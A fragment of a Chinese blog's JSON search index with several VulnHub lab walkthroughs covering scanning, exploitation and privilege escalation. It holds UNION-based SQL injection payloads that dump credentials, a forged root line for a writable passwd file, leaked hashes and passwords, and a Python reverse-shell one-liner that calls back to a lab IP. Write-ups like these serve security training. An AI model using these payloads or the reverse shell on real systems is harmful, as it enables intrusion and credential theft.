src=\"/vulnhub_img/WEBRESOURCEca70c67f64233f0005d2b2eeb10215b1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后用hydra进行爆破即可，但是这里完了截图，爆破出来应该是a1b2c3d4:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0fe391cc8c464547415fd2093ee97c26%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e看到当前是chili的家目录，第一反应是写密钥，但是很可惜，可以开放ssh服务：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9003b2be5cbc0076f109d201c80f50b5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e从web入手，写shell吧：\u003c/p\u003e\n\u003cp\u003e可以发现.nano目录是具有权限的，然后直接把反弹shell的php代码上传上去即可，记得给木马执行权限，直接给777：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb0727ec019c27a75388ad7ecbb13c472%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003epasswd文件可写：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6c76748d05ae9d0839cfcde67980cafe%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003echili用户是可以切换的，直接改passwd文件密码吧，密码Abcd1234\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eroot:$1$ZytY2Uoj$1.aU20M/0/xD4Wo1ymW9Z0:0:0:root:/root:/bin/bash\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE62e5b3d7d2fb2aba0052d425977bacbf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc588481c1817e4c5db8d7cea64ab5bc7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x041 Chili"},{"content":"端口扫描 渗透 发现root目录，同时发现疑似提示，htdig to index our doc-tree。\n收集到用户名：mailto\n去收集了一下htdig是什么，然后没发现有用的利用方式：\n完犊子，\n/openemr目录：\n已知漏洞\n修改url:\nadmin:3863efef9ee2bfbc51ecdca359c6302bed1389e8\nmedical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d\nackbar\nmedical\n在这个地方修改文件即可getshell:\n提权 有点懒了，看了一下提示：/usr/bin/healthcheck：\nstrings查看一下：\n就可以琢磨一下该如何提权了，执行了ifconfig、fdisk、du等命令\n环境变量劫持：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x042-healthcare/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE721e51dce6cbb51dd77f0103d630b374%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1f8a325a62d5ea53cf7d732b00a6ea0a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEcb5fed76c836fa3fb24bc8775283f861%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e发现root目录，同时发现疑似提示，htdig to index our doc-tree。\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe5bee896284035ca7d5dfa57d08d5eeb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e收集到用户名：mailto\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2f81e86127e92461a9368572c79122e2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e去收集了一下htdig是什么，然后没发现有用的利用方式：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc715cb48f261bce244ad2bc8ff1e19bb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e完犊子，\u003c/p\u003e\n\u003cp\u003e/openemr目录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2dc9e93042d44e8c1611470bfd44be00%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE669763ecc9aada6e60dcb92515013bdb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e已知漏洞\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe99c9babf39ad167769ebd33cde84b3a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e修改url:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7372197d2030bd3d5099ef705dd492bc%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eadmin:3863efef9ee2bfbc51ecdca359c6302bed1389e8\u003c/p\u003e\n\u003cp\u003emedical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9438afb5408cf36f1f6d824423833aaa%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eackbar\u003c/p\u003e\n\u003cp\u003emedical\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6433f10c8f0b2588dfc5e4748f932a6d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e在这个地方修改文件即可getshell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3336070e4d90be577f491a170b6be89a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb1289f6b9292b8f0a3ba13d0f7e4a6f1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e有点懒了，看了一下提示：/usr/bin/healthcheck：\u003c/p\u003e\n\u003cp\u003estrings查看一下：\u003c/p\u003e\n\u003cp\u003e就可以琢磨一下该如何提权了，执行了ifconfig、fdisk、du等命令\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfab4d42f7c9735cfd7bf58067508686d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e环境变量劫持：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8e614d21cd198ebe1ed8ee176dcb1a64%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x042 Healthcare"},{"content":"要改网络环境\n端口扫描 渗透 先看了一下smb，发现有未授权，但是没有什么信息：\n80端口\n扫描发现log目录，说了以下几个目录，可能可以利用？其他东西就没了，\n再看看日志：\n那么有没有可能我传的东西会在日志里面，但是很遗憾，我上传的东西并不在，但是发现有其他东西：\n呐就有思路了，上传文件，等反弹shell:\n提权 CVE-2021-4034秒了\nSUID也可以：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x043-sunset-dawn/","summary":"\u003cp\u003e要改网络环境\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfcf39f4415ab4ce05541b96bb66aa5d2%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE66050efeac080fa8a5a93f698f44e958%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE75256777e579269d7ff0a2113a8a01f1%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e先看了一下smb，发现有未授权，但是没有什么信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE163afbe54b75d8e755334f7d0a3b7a3d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9b92fda3276da5d2dc45874f5392f64d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口\u003c/p\u003e\n\u003cp\u003e扫描发现log目录，说了以下几个目录，可能可以利用？其他东西就没了，\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE358e16ae51a4ac296e188f3c54b43f38%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e再看看日志：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb1b6c2a118d1760aded5c8f0bc256e1b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么有没有可能我传的东西会在日志里面，但是很遗憾，我上传的东西并不在，但是发现有其他东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE195726d9a2c0c7cbf28c87d33f6c8714%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e呐就有思路了，上传文件，等反弹shell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE70d07aa093b3be950a373c83cb1df2f9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e\u003cstrong\u003eCVE-2021-4034秒了\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6dc33c940cf5873ebf35289ea88b9797%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSUID也可以：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8e32c8235ef5206f6fe940d18e18537f%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x043 sunset dawn"},{"content":"端口扫描 渗透 无匿名登录：\n然后看了一下80端口，这里有个坑点，也是没有发现sql注入的原因：\n这里的payload是：{\u0026ldquo;lastviewed\u0026rdquo;==\u0026ldquo;Netherlands\u0026rdquo;}\n得改成\u0026quot;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Netherlands\u0026rsquo;\u0026quot;}“才能正常执行功能\n后续就是手动注入：\n查看版本\n\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Netherlands\u0026rsquo;union select version();#\u0026rdquo;}\u0026quot;\n判断回显：\u0026quot;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select 1;#\u0026quot;}\u0026quot;\n\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(database()) ;#\u0026rdquo;}\u0026quot;\n查询到当前数据库为library:\n\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(table_name) from information_schema.tables where table_schema=\u0026lsquo;library\u0026rsquo;#\u0026rdquo;}\u0026quot;\n查询到当前数据库下有两个表：access,countries\n查看access表里面的列名：\n\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(column_name) from information_schema.columns where table_name=\u0026lsquo;access\u0026rsquo; #\u0026rdquo;}\u0026quot;\nid,service,username,password\n查询账号密码：\n\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(\u0026rsquo;\\n\u0026rsquo;,id,\u0026rsquo;\\n\u0026rsquo;,service,\u0026rsquo;\\n\u0026rsquo;,username,\u0026rsquo;\\n\u0026rsquo;,password) from access #\u0026rdquo;}\u0026quot;\n1\nftp\nglobus\nAroundTheWorld\n成功连接FTP，ls发现具有html写入权限：\n这里最好别用echo，都是kaili里面，还是用vim吧：\n提权 2021-4034：\n还有一种提权方式：root密码是password，和数据库密码一样\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x044-the-library/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9c8d1650c99445ba77eee28ab1e630d7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE433b5413969bf70ace6a7cf4db8f7bb9%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf4a0837874780ad099a5c1f6841754bd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e无匿名登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbdb2ca5cd78a55cb2b03a798a3e4cf0c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后看了一下80端口，这里有个坑点，也是没有发现sql注入的原因：\u003c/p\u003e\n\u003cp\u003e这里的payload是：{\u0026ldquo;lastviewed\u0026rdquo;==\u0026ldquo;Netherlands\u0026rdquo;}\u003c/p\u003e\n\u003cp\u003e得改成\u0026quot;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Netherlands\u0026rsquo;\u0026quot;}“才能正常执行功能\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc9831f543ab8228a06efac4a00d350b9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE62cff9ecb3c3f46cc68c730e86b322d3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后续就是手动注入：\u003c/p\u003e\n\u003cp\u003e查看版本\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Netherlands\u0026rsquo;union select version();#\u0026rdquo;}\u0026quot;\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9a363c8b7c0edf8bab6fb1b034aa90f0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e判断回显：\u0026quot;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select 1;#\u0026quot;}\u0026quot;\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE74d76e2f3253fe7c6299e9f63735810aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(database()) ;#\u0026rdquo;}\u0026quot;\u003c/p\u003e\n\u003cp\u003e查询到当前数据库为library:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf67775b0021f27fa6c9d96f7f8f41d10image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(table_name) from information_schema.tables where table_schema=\u0026lsquo;library\u0026rsquo;#\u0026rdquo;}\u0026quot;\u003c/p\u003e\n\u003cp\u003e查询到当前数据库下有两个表：access,countries\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEe41ee384393586dada13e2660dcae22aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查看access表里面的列名：\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(column_name) from information_schema.columns where table_name=\u0026lsquo;access\u0026rsquo; #\u0026rdquo;}\u0026quot;\u003c/p\u003e\n\u003cp\u003eid,service,username,password\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEedf2be4d328bd9071e1e1f0acdcbe9e5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查询账号密码：\u003c/p\u003e\n\u003cp\u003e\u0026ldquo;{\u0026ldquo;lastviewed\u0026rdquo;==\u0026quot;\u0026lsquo;Nethe11rlands\u0026rsquo;union select group_concat(\u0026rsquo;\\n\u0026rsquo;,id,\u0026rsquo;\\n\u0026rsquo;,service,\u0026rsquo;\\n\u0026rsquo;,username,\u0026rsquo;\\n\u0026rsquo;,password) from access #\u0026rdquo;}\u0026quot;\u003c/p\u003e\n\u003cp\u003e1\u003c/p\u003e\n\u003cp\u003eftp\u003c/p\u003e\n\u003cp\u003eglobus\u003c/p\u003e\n\u003cp\u003eAroundTheWorld\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEb4d0b61ff88eb911a1153974da677af0image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x044 The Library"},{"content":"端口扫描 渗透 注册一个账号：\n登录：\n这里说来惭愧，又是因为懒病，放弃了手动注入，：\n破解superadmin的密码：\n登录superadmin，发现上传框：\n提权 2021-4034\nSUID\n补一下手动注入：\nSecurity \u0026rsquo; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026ldquo;webapphacking\u0026rdquo;#\n表名：webapphacking\nbooks,users\n列名：\nSecurity \u0026rsquo; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026lsquo;users\u0026rsquo;#\nUSER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,user,pasword,name,address\nSecurity \u0026rsquo; union select 1,2,group_concat(USER,\u0026rsquo;\\n\u0026rsquo;,pasword) from users#\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x045-hackme/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd1cbf554d8355862b3021bb89beeff36image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEfbe85a19601dd4ab45658e125c479a22image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE2ca59bd6ad66b614526f86153da62412image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e注册一个账号：\u003c/p\u003e\n\u003cp\u003e登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf01c1126efd226c4623af26d1209548eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里说来惭愧，又是因为懒病，放弃了手动注入，：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE131691fd40e674bf20ece71bbd03e30aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解superadmin的密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE951d4c0e6f55607b087e322c763d127aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE07a00374def5f424c41f7d538c337b09image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录superadmin，发现上传框：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE793b853904c8b04c69af14eeab91e1e9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE02474309031324a3ef3009fd3751ae87image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd021cc4c7bd9b7caef5258b5637652a2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e2021-4034\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEd376626b8072310083501b60ebbcddf3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSUID\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa8c319e467a607c10f3e5cbe807c550bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e补一下手动注入：\u003c/p\u003e\n\u003cp\u003eSecurity \u0026rsquo; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026ldquo;webapphacking\u0026rdquo;#\u003c/p\u003e\n\u003cp\u003e表名：webapphacking\u003c/p\u003e\n\u003cp\u003ebooks,users\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b8aadd8c45cb8915003cc95318e9b9eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e列名：\u003c/p\u003e\n\u003cp\u003eSecurity \u0026rsquo; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026lsquo;users\u0026rsquo;#\u003c/p\u003e\n\u003cp\u003eUSER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,user,pasword,name,address\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEa276bc3a5cc899df9c190b484f6fdedcimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eSecurity \u0026rsquo; union select 1,2,group_concat(USER,\u0026rsquo;\\n\u0026rsquo;,pasword) from users#\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4effe1089c2998f430edd3c5d62346f6image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x045 hackme"},{"content":"还是向virtualbox妥协了，这次这个问题出现在导入的地方，不是很好解决\n端口扫描 渗透 发现有效信息：\n但是不知道用户名，只能把首页上的用户名都试试了：\n出现一个提示不支持的签名，这个之前遇到过，需要改一下配置文件：\n好像登录上去了：\n提权 这次提权有点意思，很多命令被禁用了，只手动挨个找，总于在查找计划任务时找到线索：\n先提权到jimmy用户吧：\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.5.104\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/bash\u0026#34;,\u0026#34;-i\u0026#34;]); 发现SUID权限程序：\n但是使用了绝对路径，相关文件没有权限：\n后面无奈看了WP，结果还是爆破，当初直接爆破会不会更好呢，不同的是，这次cewl的密码本不太够了。实测john生成的不太好用，规则太死了：\n需要生成特定的社工字典：\nhttps://www.bugku.com/mima/\n然后爆破成功：\n这也是root密码：\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x046-born2root/","summary":"\u003cp\u003e还是向virtualbox妥协了，这次这个问题出现在导入的地方，不是很好解决\u003c/p\u003e\n\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5df578715597c3b49f4243d472dcbbc3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc09a104349dea9c2b05f1e7c2aa9cc16image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE85c695b652a1e26fe7e61944e338dbe5image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf4c5bbbe1a9792b52962a819a7b4cc04image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE0ed3c7892f2075a49877697a30ee67edimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现有效信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE791506b014227d0912174c412d54b9bbimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEae0a0635ac2108b46d4ef9863d41e88dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是不知道用户名，只能把首页上的用户名都试试了：\u003c/p\u003e\n\u003cp\u003e出现一个提示不支持的签名，这个之前遇到过，需要改一下配置文件：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdf3314cbc19624c5b2a130d6a462eae8image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e好像登录上去了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1b65f822c742c7e7f7868a350631fab3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e这次提权有点意思，很多命令被禁用了，只手动挨个找，总于在查找计划任务时找到线索：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEac6037d08b857388dd6d8efbd7ed288aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e先提权到jimmy用户吧：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimport 